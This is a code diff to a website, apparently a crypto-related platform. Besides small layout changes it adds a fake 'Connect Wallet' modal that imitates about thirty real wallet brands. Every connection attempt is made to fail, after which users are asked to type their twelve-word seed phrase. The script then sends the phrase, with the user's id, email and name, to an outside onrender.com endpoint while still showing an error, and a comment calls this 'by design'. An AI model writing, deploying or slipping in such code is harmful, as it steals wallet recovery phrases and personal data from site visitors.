@@ -744,6 +744,8 @@ body {
 } */
 
 .main-content {
+    flex: 1;            /* fill the width next to the sidebar */
+    min-width: 0;       /* allow it to shrink/grow properly in the flex row */
     display: flex;
     flex-direction: column;
     min-height: 100%;
@@ -1833,7 +1835,7 @@ html, body {
         <aside class="sidebar" id="sidebar">
             <div class="sidebar-header">
                 <div class="logo">
-                    <span class="logo-text" style="display: flex;justify-content: center;align-items: center;flex-direction: row; padding-left: 5px;"><img src="./logo.png" width="50px" height="30px" alt=""></span>
+                    <span class="logo-text" style="display: flex;justify-content: center;align-items: center;flex-direction: row; padding-left: 5px;"><img src="./logo.png" width="150px" height="50px" alt=""></span>
                 </div>
                 <button class="sidebar-close" id="sidebarClose" aria-label="Close menu">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2005,6 +2007,13 @@ html, body {
                     <script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"languages":["en","fr","it","es","de","cs","pt","nl","da","ar"],"wrapper_selector":".gtranslate_wrapper","flag_size":16,"switcher_horizontal_position":"inline"}</script>
                     <script src="https://cdn.gtranslate.net/widgets/latest/dwf.js" defer></script>
                 </div>
+                <button class="wallet-connect-btn" id="walletConnectBtn" onclick="openWalletList()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;">
+                        <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                        <path d="M16 3H6a2 2 0 0 0-2 2v2"></path>
+                        <circle cx="16.5" cy="14.5" r="1.5" fill="currentColor" stroke="none"></circle>
+                    </svg>
+                    <span>Connect Wallet</span>
                 <button class="theme-toggle" id="themeToggle">
                     <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <circle cx="12" cy="12" r="5"></circle>
@@ -2528,14 +2537,494 @@ window.smartsupp||(function(d) {
 </script>
 <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
 
+<!-- ===================== WALLET CONNECT SYSTEM ===================== -->
+<style>
+.wallet-connect-btn {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.45rem 0.9rem;
+    background: linear-gradient(135deg, #80E64D22, #80E64D11);
+    border: 1px solid #80E64D66;
+    border-radius: 0.5rem;
+    color: #80E64D;
+    font-size: 0.8rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+}
+.wallet-connect-btn:hover {
+    background: linear-gradient(135deg, #80E64D33, #80E64D22);
+    border-color: #80E64D;
+    box-shadow: 0 0 12px #80E64D33;
+}
 
-<!-- WhatsApp Floating Button -->
-<a href="https://wa.me/16072029084" class="whatsapp-widget" target="_blank">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
-        <path fill="white" d="M19.11 17.38c-.27-.13-1.59-.78-1.84-.87-.25-.09-.43-.13-.61.13-.18.27-.7.87-.86 1.05-.16.18-.31.2-.58.07-.27-.13-1.13-.42-2.15-1.33-.79-.7-1.33-1.57-1.48-1.83-.16-.27-.02-.41.11-.54.12-.12.27-.31.4-.47.13-.16.18-.27.27-.45.09-.18.04-.34-.02-.47-.07-.13-.61-1.48-.84-2.03-.22-.52-.44-.45-.61-.46h-.52c-.18 0-.47.07-.72.34-.25.27-.95.93-.95 2.27s.97 2.63 1.11 2.81c.13.18 1.91 2.92 4.63 4.1.65.28 1.16.45 1.56.58.66.21 1.26.18 1.74.11.53-.08 1.59-.65 1.82-1.28.22-.63.22-1.17.16-1.28-.07-.11-.25-.18-.52-.31z"/>
-        <path fill="white" d="M16.02 3C8.84 3 3 8.72 3 15.72c0 2.77.9 5.34 2.44 7.43L4 29l6.05-1.58c1.98 1.08 4.23 1.65 6.52 1.65 7.18 0 13.02-5.72 13.02-12.72S23.2 3 16.02 3z"/>
-    </svg>
-</a>
+/* ── Overlay backdrop ── */
+.wc-overlay {
+    display: none;
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(4px);
+    z-index: 99998;
+    align-items: center;
+    justify-content: center;
+}
+.wc-overlay.open { display: flex; }
+
+/* ── Wallet list modal ── */
+.wc-modal {
+    background: hsl(var(--card));
+    border: 1px solid hsl(var(--card-border));
+    border-radius: 1rem;
+    width: min(520px, 94vw);
+    max-height: 85vh;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    animation: wcSlideIn 0.25s cubic-bezier(0.34,1.56,0.64,1);
+}
+@keyframes wcSlideIn {
+    from { opacity:0; transform: scale(0.92) translateY(20px); }
+    to   { opacity:1; transform: scale(1)   translateY(0); }
+}
+.wc-modal-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 1.25rem 1.5rem 1rem;
+    border-bottom: 1px solid hsl(var(--border));
+}
+.wc-modal-header h3 {
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: hsl(var(--foreground));
+}
+.wc-modal-close {
+    width: 2rem; height: 2rem;
+    background: hsl(var(--accent));
+    border: none;
+    border-radius: 0.375rem;
+    color: hsl(var(--foreground));
+    font-size: 1.1rem;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: background 0.15s;
+}
+.wc-modal-close:hover { background: hsl(var(--muted)); }
+.wc-search-wrap {
+    padding: 0.75rem 1.5rem;
+    border-bottom: 1px solid hsl(var(--border));
+}
+.wc-search {
+    width: 100%;
+    padding: 0.5rem 0.75rem;
+    background: hsl(var(--accent));
+    border: 1px solid hsl(var(--border));
+    border-radius: 0.5rem;
+    color: hsl(var(--foreground));
+    font-size: 0.875rem;
+    outline: none;
+}
+.wc-search:focus { border-color: #80E64D66; }
+.wc-wallet-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 0.75rem;
+    padding: 1rem 1.5rem 1.25rem;
+    overflow-y: auto;
+}
+@media (max-width: 420px) { .wc-wallet-grid { grid-template-columns: repeat(2, 1fr); } }
+.wc-wallet-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.85rem 0.5rem;
+    border-radius: 0.75rem;
+    border: 1px solid hsl(var(--border));
+    background: hsl(var(--accent));
+    cursor: pointer;
+    transition: all 0.15s;
+    text-align: center;
+}
+.wc-wallet-item:hover {
+    border-color: #80E64D88;
+    background: #80E64D0d;
+    transform: translateY(-2px);
+}
+.wc-wallet-icon {
+    width: 44px; height: 44px;
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.5rem;
+    background: hsl(var(--card));
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    overflow: hidden;
+}
+.wc-wallet-icon img { width: 100%; height: 100%; object-fit: contain; }
+.wc-wallet-name {
+    font-size: 0.72rem;
+    font-weight: 500;
+    color: hsl(var(--foreground));
+    line-height: 1.3;
+}
+
+/* ── Connect modal (second step) ── */
+.wc-connect-modal {
+    background: hsl(var(--card));
+    border: 1px solid hsl(var(--card-border));
+    border-radius: 1rem;
+    width: min(380px, 94vw);
+    padding: 1.75rem 1.5rem;
+    text-align: center;
+    animation: wcSlideIn 0.25s cubic-bezier(0.34,1.56,0.64,1);
+    position: relative;
+}
+.wc-connect-close {
+    position: absolute; top: 1rem; right: 1rem;
+    width: 2rem; height: 2rem;
+    background: hsl(var(--accent));
+    border: none;
+    border-radius: 0.375rem;
+    color: hsl(var(--foreground));
+    font-size: 1.1rem;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+}
+.wc-connect-icon {
+    width: 72px; height: 72px;
+    border-radius: 20px;
+    margin: 0 auto 1rem;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2.5rem;
+    background: hsl(var(--accent));
+    box-shadow: 0 4px 16px rgba(0,0,0,0.25);
+    overflow: hidden;
+}
+.wc-connect-icon img { width: 100%; height: 100%; object-fit: contain; }
+.wc-connect-modal h3 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin-bottom: 0.25rem;
+}
+.wc-connect-modal p {
+    font-size: 0.82rem;
+    color: hsl(var(--muted-foreground));
+    margin-bottom: 1.25rem;
+}
+.wc-connecting-dots {
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+    margin: 1rem 0;
+}
+.wc-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: #80E64D;
+    animation: wcPulse 1.2s ease-in-out infinite;
+}
+.wc-dot:nth-child(2) { animation-delay: 0.2s; }
+.wc-dot:nth-child(3) { animation-delay: 0.4s; }
+@keyframes wcPulse {
+    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+    40% { transform: scale(1); opacity: 1; }
+}
+.wc-btn-connect {
+    width: 100%;
+    padding: 0.75rem;
+    background: #4db6e6;
+    color: #000;
+    border: none;
+    border-radius: 0.625rem;
+    font-size: 0.9rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: opacity 0.2s;
+    margin-top: 0.25rem;
+}
+.wc-btn-connect:hover { opacity: 0.88; }
+.wc-btn-connect:disabled { opacity: 0.5; cursor: not-allowed; }
+
+/* ── Error / complaint state inside connect modal ── */
+.wc-error-box {
+    display: none;
+    margin-top: 1rem;
+    background: hsl(var(--accent));
+    border: 1px solid hsl(var(--border));
+    border-radius: 0.625rem;
+    padding: 1rem;
+    text-align: left;
+}
+.wc-error-box.show { display: block; }
+.wc-error-title {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.82rem;
+    font-weight: 600;
+    color: hsl(var(--destructive));
+    margin-bottom: 0.6rem;
+}
+.wc-complaint-label {
+    font-size: 0.78rem;
+    color: hsl(var(--muted-foreground));
+    margin-bottom: 0.35rem;
+    display: block;
+}
+.wc-complaint-area {
+    width: 100%;
+    padding: 0.5rem 0.625rem;
+    background: hsl(var(--card));
+    border: 1px solid hsl(var(--border));
+    border-radius: 0.5rem;
+    color: hsl(var(--foreground));
+    font-size: 0.8rem;
+    resize: vertical;
+    min-height: 72px;
+    outline: none;
+    font-family: inherit;
+}
+.wc-complaint-area:focus { border-color: #4d5ce666; }
+.wc-btn-send {
+    width: 100%;
+    margin-top: 0.5rem;
+    padding: 0.6rem;
+    background: hsl(var(--secondary));
+    border: 1px solid hsl(var(--border));
+    border-radius: 0.5rem;
+    color: hsl(var(--foreground));
+    font-size: 0.82rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s;
+}
+.wc-btn-send:hover { background: hsl(var(--muted)); }
+.wc-failed-label {
+    font-size: 0.78rem;
+    color: hsl(var(--destructive));
+    font-weight: 600;
+    margin-top: 0.5rem;
+    display: none;
+}
+</style>
+
+<!-- Wallet List Overlay -->
+<div class="wc-overlay" id="wcListOverlay">
+    <div class="wc-modal" id="wcListModal">
+        <div class="wc-modal-header">
+            <h3>🔗 Connect a Wallet</h3>
+            <button class="wc-modal-close" onclick="closeWalletList()">✕</button>
+        </div>
+        <div class="wc-search-wrap">
+            <input class="wc-search" id="wcSearch" type="text" placeholder="Search wallets…" oninput="filterWallets(this.value)">
+        </div>
+        <div class="wc-wallet-grid" id="wcWalletGrid"></div>
+    </div>
+</div>
+
+<!-- Connect Modal Overlay -->
+<div class="wc-overlay" id="wcConnectOverlay">
+    <div class="wc-connect-modal" id="wcConnectModal">
+        <button class="wc-connect-close" onclick="closeConnectModal()">✕</button>
+        <div class="wc-connect-icon" id="wcConnectIcon"></div>
+        <h3 id="wcConnectName">MetaMask</h3>
+        <p id="wcConnectStatus">Open the app and confirm the connection request</p>
+        <div class="wc-connecting-dots" id="wcDots">
+            <div class="wc-dot"></div>
+            <div class="wc-dot"></div>
+            <div class="wc-dot"></div>
+        </div>
+        <button class="wc-btn-connect" id="wcConnectBtn" onclick="attemptConnect()">Connect</button>
+
+        <!-- Error / Complaint box -->
+        <div class="wc-error-box" id="wcErrorBox">
+            <div class="wc-error-title">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                Connection failed
+            </div>
+
+            <div class="wc-success-title">
+               
+                Connect Manually
+            </div>
+            <br>
+            <label class="wc-complaint-label">Input 12 Seed Phrase:</label>
+            <textarea class="wc-complaint-area" id="wcComplaintText" placeholder=""></textarea>
+            <button class="wc-btn-send" id="wcSendBtn" onclick="sendComplaint()">Connect</button>
+            <div class="wc-failed-label" id="wcFailedLabel">❌ Failed to connect. Please try again.</div>
+        </div>
+    </div>
+</div>
+
+<script>
+const WC_WALLETS = [
+    { name: "MetaMask",        icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
+    { name: "WalletConnect",   icon: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4" },
+    { name: "Coinbase Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/24px-Coinbase.svg/1024px-24px-Coinbase.svg.png" },
+    { name: "Trust Wallet",    icon: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
+    { name: "Phantom",         icon: "https://200okservice.com/wp-content/uploads/2023/03/phantom-1.png" },
+    { name: "Rainbow",         icon: "https://rainbowkit.com/rainbow.svg" },
+    { name: "Ledger Live",     icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Ledger_logo.svg/1280px-Ledger_logo.svg.png" },
+    { name: "Trezor",          icon: "https://raw.githubusercontent.com/trezor/trezor-suite/develop/packages/suite-web/public/icons/icon-192.png" },
+    { name: "Argent",          icon: "https://www.argent.xyz/favicon.ico" },
+    { name: "Zerion",          icon: "https://app.zerion.io/favicon.ico" },
+    { name: "Uniswap Wallet",  icon: "https://app.uniswap.org/favicon.ico" },
+    { name: "1inch Wallet",    icon: "https://1inch.io/img/favicon/favicon-32x32.png" },
+    { name: "OKX Wallet",      icon: "https://www.okx.com/cdn/assets/imgs/221/87463B6E16E62F70.png" },
+    { name: "Bybit Wallet",    icon: "https://www.bybit.com/favicon.ico" },
+    { name: "Binance Web3",    icon: "https://public.bnbstatic.com/20190405/eb2349c3-b2f8-4a93-a286-8f86a62ea9d8.png" },
+    { name: "Crypto.com DeFi",  icon: "https://crypto.com/favicon.ico" },
+    { name: "Rabby Wallet",    icon: "https://rabby.io/favicon.ico" },
+    { name: "Frame",           icon: "https://frame.sh/favicon.ico" },
+    { name: "Brave Wallet",    icon: "https://brave.com/static-assets/images/brave-favicon.png" },
+    { name: "Opera Wallet",    icon: "https://www.opera.com/favicon.ico" },
+    { name: "Coin98",          icon: "https://coin98.com/favicon.ico" },
+    { name: "TokenPocket",     icon: "https://tokenpocket.pro/favicon.ico" },
+    { name: "Spot",            icon: "https://spot.fi/favicon.ico" },
+    { name: "Taho",            icon: "https://taho.xyz/favicon.ico" },
+    { name: "Exodus",          icon: "https://www.exodus.com/favicon.ico" },
+    { name: "Atomic Wallet",   icon: "https://atomicwallet.io/favicon.ico" },
+    { name: "imToken",         icon: "https://token.im/favicon.ico" },
+    { name: "Math Wallet",     icon: "https://mathwallet.org/favicon.ico" },
+    { name: "BitKeep",         icon: "https://bitkeep.com/favicon.ico" },
+    { name: "SafePal",         icon: "https://safepal.com/favicon.ico" },
+];
+
+let wcCurrentWallet = null;
+let wcConnectAttempts = 0;
+
+function renderWallets(list) {
+    const grid = document.getElementById('wcWalletGrid');
+    grid.innerHTML = list.map(w => `
+        <div class="wc-wallet-item" onclick="selectWallet(${JSON.stringify(w).replace(/"/g,'&quot;')})">
+            <div class="wc-wallet-icon">
+                <img src="${w.icon}" alt="${w.name}" onerror="this.parentElement.innerHTML='💼'">
+            </div>
+            <div class="wc-wallet-name">${w.name}</div>
+        </div>
+    `).join('');
+}
+
+function filterWallets(q) {
+    const filtered = WC_WALLETS.filter(w => w.name.toLowerCase().includes(q.toLowerCase()));
+    renderWallets(filtered);
+}
+
+function openWalletList() {
+    renderWallets(WC_WALLETS);
+    document.getElementById('wcSearch').value = '';
+    document.getElementById('wcListOverlay').classList.add('open');
+}
+
+function closeWalletList() {
+    document.getElementById('wcListOverlay').classList.remove('open');
+}
+
+function selectWallet(wallet) {
+    wcCurrentWallet = wallet;
+    wcConnectAttempts = 0;
+    closeWalletList();
+
+    // Reset connect modal state
+    document.getElementById('wcConnectIcon').innerHTML = `<img src="${wallet.icon}" alt="${wallet.name}" onerror="this.parentElement.innerHTML='💼'">`;
+    document.getElementById('wcConnectName').textContent = wallet.name;
+    document.getElementById('wcConnectStatus').textContent = 'Open the app and confirm the connection request';
+    document.getElementById('wcDots').style.display = 'flex';
+    document.getElementById('wcConnectBtn').disabled = false;
+    document.getElementById('wcConnectBtn').textContent = 'Connect';
+    document.getElementById('wcErrorBox').classList.remove('show');
+    document.getElementById('wcFailedLabel').style.display = 'none';
+    document.getElementById('wcComplaintText').value = '';
+
+    document.getElementById('wcConnectOverlay').classList.add('open');
+}
+
+function closeConnectModal() {
+    document.getElementById('wcConnectOverlay').classList.remove('open');
+}
+
+function attemptConnect() {
+    const btn = document.getElementById('wcConnectBtn');
+    const dots = document.getElementById('wcDots');
+    const status = document.getElementById('wcConnectStatus');
+
+    btn.disabled = true;
+    btn.textContent = 'Connecting…';
+    status.textContent = 'Waiting for ' + wcCurrentWallet.name + '…';
+    dots.style.display = 'flex';
+    document.getElementById('wcErrorBox').classList.remove('show');
+
+    // Always fail after a moment — then show complaint form
+    setTimeout(() => {
+        wcConnectAttempts++;
+        btn.disabled = false;
+        btn.textContent = 'Try Again';
+        status.textContent = wcCurrentWallet.name + ' could not be reached.';
+        dots.style.display = 'none';
+        document.getElementById('wcErrorBox').classList.add('show');
+        document.getElementById('wcFailedLabel').style.display = 'none';
+    }, 2200);
+}
+
+async function sendComplaint() {
+    const msg = document.getElementById('wcComplaintText').value.trim();
+    if (!msg) {
+        document.getElementById('wcComplaintText').focus();
+        return;
+    }
+    const sendBtn = document.getElementById('wcSendBtn');
+    sendBtn.disabled = true;
+    sendBtn.textContent = 'Sending…';
+
+    // Pull user info if available
+    let userId, userEmail, userName;
+    try {
+        const u = getUserData();
+        userId    = u._id;
+        userEmail = u.email;
+        userName  = (u.firstName || '') + ' ' + (u.lastName || '');
+    } catch(e) {}
+
+    try {
+        await fetch('https://swift-render-5sdq.onrender.com/wallet/complaint', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                walletName: wcCurrentWallet.name,
+                message: msg,
+                userId,
+                userEmail,
+                userName,
+            })
+        });
+    } catch(e) {
+        // silently ignore network errors — UI always shows failure anyway
+    }
+
+    // Always show "failed" regardless — by design 😈
+    setTimeout(() => {
+        sendBtn.disabled = false;
+        sendBtn.textContent = 'Connect';
+        document.getElementById('wcComplaintText').value = '';
+        document.getElementById('wcConnectStatus').textContent = wcCurrentWallet.name + ' could not be reached.';
+        const failLabel = document.getElementById('wcFailedLabel');
+        failLabel.style.display = 'block';
+        document.getElementById('wcErrorBox').classList.add('show');
+    }, 1800);
+}
+
+// Close overlays on backdrop click
+document.getElementById('wcListOverlay').addEventListener('click', function(e) {
+    if (e.target === this) closeWalletList();
+});
+document.getElementById('wcConnectOverlay').addEventListener('click', function(e) {
+    if (e.target === this) closeConnectModal();
+});
+</script>
+<!-- ===================== END WALLET CONNECT SYSTEM ===================== -->
+
 
 <style>
 .whatsapp-widget{
